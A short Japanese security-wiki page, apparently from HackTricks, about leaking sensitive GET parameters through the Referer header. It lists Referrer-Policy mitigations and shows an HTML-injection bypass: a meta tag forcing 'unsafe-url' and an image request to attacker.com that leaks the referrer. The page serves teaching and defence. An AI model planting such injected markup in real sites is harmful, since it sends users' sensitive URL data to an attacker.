# Interesting HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer ヘッダーと policy

Referrer は、以前に訪問したページをブラウザが示すために使用するヘッダーです。

### Sensitive information leak

Web ページ内のいずれかの時点で、GET request のパラメータに sensitive information が含まれており、そのページに外部ソースへのリンクがある場合、または attacker が user に attacker が管理する URL へアクセスするよう誘導・提案（social engineering）できる場合、最新の GET request に含まれる sensitive information を exfiltrate できる可能性があります。

### Mitigation

ブラウザに **Referrer-policy** を適用することで、sensitive information が他の web applications に送信されるのを **avoid** できます：
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### 対策回避

HTML meta tagを使用してこのルールを上書きできます（攻撃者はHTML injectionを悪用する必要があります）。
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 防御

URLのGETパラメータやパスには、機密データを絶対に含めないでください。

{{#include ../banners/hacktricks-training.md}}
